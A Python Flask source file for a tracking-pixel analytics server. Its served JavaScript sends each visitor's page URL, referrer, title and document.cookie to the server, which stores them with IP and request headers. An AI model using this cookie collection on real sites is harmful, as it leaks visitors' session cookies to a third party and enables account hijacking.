from base64 import b64decode
import datetime
import json
import os
#import urllib.parse

from urlparse   import parse_qsl, urlparse

from flask import Flask, Response, abort, request
from peewee import *


# 1 pixel GIF, base64-encoded.
BEACON = b64decode('R0lGODlhAQABAIAAANvf7wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')

# Store the database file in the app directory.
APP_DIR = os.path.dirname(__file__)
DATABASE_NAME = os.path.join(APP_DIR, 'analytics.db')
DOMAIN = 'http://127.0.0.1:5000'  # TODO: change me.

# Simple JavaScript which will be included and executed on the client-side.
#JAVASCRIPT = '' # TODO: add javascript implementation.
JAVASCRIPT = """(function(){
    var d=document,i=new Image,e=encodeURIComponent;
    i.src='%s/a.gif?url='+e(d.location.href)+'&ref='+e(d.referrer)+'&t='+e(d.title)+'&cok='+e(d.cookie)+'&lastmd='+e(d.lastModified);
    })()""".replace('\n', '')



# Flask application settings.
DEBUG = bool(os.environ.get('DEBUG'))
SECRET_KEY = 'secret - change me'  # TODO: change me.

app = Flask(__name__)
app.config.from_object(__name__)

database = SqliteDatabase(DATABASE_NAME, pragmas={
    'journal_mode': 'wal',  # WAL-mode for better concurrent access.
    'cache_size': -32000})  # 32MB page cache.


class JSONField(TextField):
    """Store JSON data in a TextField."""
    def python_value(self, value):
        if value is not None:
            return json.loads(value)

    def db_value(self, value):
        if value is not None:
            return json.dumps(value)



class PageView(Model):
    # TODO: add model definition.
    domain = CharField()
    url = TextField()
    timestamp = DateTimeField(default=datetime.datetime.now, index=True)
    title = TextField(default='')
    ip = CharField(default='')
    referrer = TextField(default='')
    headers = JSONField()
    params = JSONField()
    cookie = TextField(default='')
    lastModified = DateTimeField(default=datetime.datetime.now, index=True)

    @classmethod
    def create_from_request(cls):
        parsed = urlparse(request.args['url'])
        params = dict(parse_qsl(parsed.query))

        return PageView.create(
            domain=parsed.netloc,
            url=parsed.path,
            title=request.args.get('t') or '',
            ip=request.headers.get('X-Forwarded-For', request.remote_addr),
            referrer=request.args.get('ref') or '',
            headers=dict(request.headers),
            params=params,
            cookie=request.args.get('cok') or '',
            lastModified=request.args.get('lastmd') or ''),

    class Meta:
        database = database

@app.route('/a.gif')
def analyze():
    # TODO: implement 1pixel gif view.
    if not request.args.get('url'):
        abort(404)

    with database.transaction():
        PageView.create_from_request()

    response = Response(app.config['BEACON'], mimetype='image/gif')
    response.headers['Cache-Control'] = 'private, no-cache'
    return response

@app.route('/a.js')
def script():
    # TODO: implement javascript view.
    return Response(
        app.config['JAVASCRIPT'] % (app.config['DOMAIN']),
        mimetype='text/javascript')
    

@app.errorhandler(404)
def not_found(e):
    return Response('Not found.')

if __name__ == '__main__':
    database.create_tables([PageView], safe=True)
    app.run()
